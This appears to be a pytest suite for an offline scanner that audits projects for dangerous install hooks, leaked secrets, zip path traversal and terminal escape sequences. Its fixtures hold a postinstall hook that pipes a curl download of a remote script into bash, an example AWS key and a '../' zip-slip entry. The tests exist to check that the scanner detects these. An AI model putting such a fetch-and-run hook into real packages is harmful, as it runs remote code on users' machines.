"""Portable acceptance tests for the offline native scan entrypoint."""
import json
import os
import stat
import zipfile
from types import SimpleNamespace

from tridelphi import expose
from tridelphi.audit import _safe, audit_directory, main


def test_all_three_engines_offline(tmp_path, monkeypatch):
    import socket
    import subprocess

    def forbidden(*args, **kwargs):
        raise AssertionError("native audit must not execute code or connect to the network")

    monkeypatch.setattr(socket, "create_connection", forbidden)
    monkeypatch.setattr(subprocess, "Popen", forbidden)
    (tmp_path / "package.json").write_text(json.dumps({"scripts": {
        "postinstall": "curl https://example.invalid/install.sh | bash"}}))
    (tmp_path / "dist").mkdir()
    (tmp_path / "dist/main.js").write_text('const key="AKIAIOSFODNN7EXAMPLE";')
    workflow = tmp_path / ".github/workflows/test.yml"
    workflow.parent.mkdir(parents=True)
    workflow.write_text("on: [push]\njobs:\n  check:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hello\n")
    result = audit_directory(tmp_path)
    assert set(result["engines"]) == {"install", "automation", "exposure"}
    assert result["engines"]["automation"]["files"] >= 1
    assert result["counts"]["critical"] > 0
    assert any(f["engine"] == "install" for f in result["findings"])
    assert any(f["engine"] == "exposure" for f in result["findings"])


def test_zip_cli_and_no_persisted_extraction(tmp_path, capsys):
    archive = tmp_path / "project.zip"
    with zipfile.ZipFile(archive, "w") as handle:
        handle.writestr("project/README.md", "A small project")
    code = main([str(archive), "--format", "json"])
    result = json.loads(capsys.readouterr().out)
    assert code == 0
    assert result["complete"]
    assert list(tmp_path.iterdir()) == [archive]


def test_archive_escape_rejected(tmp_path, capsys):
    archive = tmp_path / "attack.zip"
    with zipfile.ZipFile(archive, "w") as handle:
        handle.writestr("../outside.txt", "should not escape")
    assert main([str(archive)]) == 2
    assert not (tmp_path / "outside.txt").exists()
    assert "could not complete" in capsys.readouterr().err


def test_bad_zip_is_friendly_error(tmp_path, capsys):
    archive = tmp_path / "broken.zip"
    archive.write_bytes(b"not a zip")
    assert main([str(archive)]) == 2
    assert "Traceback" not in capsys.readouterr().err


def test_partial_scan_never_passes(tmp_path, monkeypatch, capsys):
    from tridelphi import audit
    original = audit.analyze_preflight

    def partial(*args, **kwargs):
        result = original(*args, **kwargs)
        result.truncated = True
        return result

    monkeypatch.setattr(audit, "analyze_preflight", partial)
    assert main([str(tmp_path), "--format", "json"]) == 2
    assert json.loads(capsys.readouterr().out)["status"] == "partial"


def test_terminal_escape_sanitized():
    assert "\x1b" not in _safe("\x1b[2Jmalicious\x00")
    assert "\u202e" not in _safe("hidden\u202ename")


def test_short_cli_entrypoint(tmp_path, capsys):
    from tridelphi.cli import main as cli_main

    assert cli_main(["audit", str(tmp_path), "--format", "json"]) == 0
    assert json.loads(capsys.readouterr().out)["schemaVersion"] == 1


def test_portable_path_traversal(tmp_path, monkeypatch):
    # Exercise Windows' no-directory-fd path even on POSIX CI.
    monkeypatch.setattr(os, "supports_fd", set())
    (tmp_path / "dist").mkdir()
    (tmp_path / "dist/main.js").write_text('const key="AKIAIOSFODNN7EXAMPLE";')
    result = expose.analyze_exposure(tmp_path, run_semgrep=False)
    assert result.coverage.complete
    assert result.gating()


def test_windows_junction_is_redirect():
    assert expose._is_redirect(SimpleNamespace(st_mode=stat.S_IFDIR, st_file_attributes=0x400))
    assert not expose._is_redirect(SimpleNamespace(st_mode=stat.S_IFDIR, st_file_attributes=0))


def test_portable_discovery_limits(tmp_path, monkeypatch):
    monkeypatch.setattr(os, "supports_fd", set())
    for i in range(3):
        (tmp_path / f"file{i}.txt").write_text("data")
    coverage = expose.ExposureCoverage()
    expose._walk(tmp_path, expose.ExposureLimits(max_entries=1), coverage)
    assert not coverage.complete
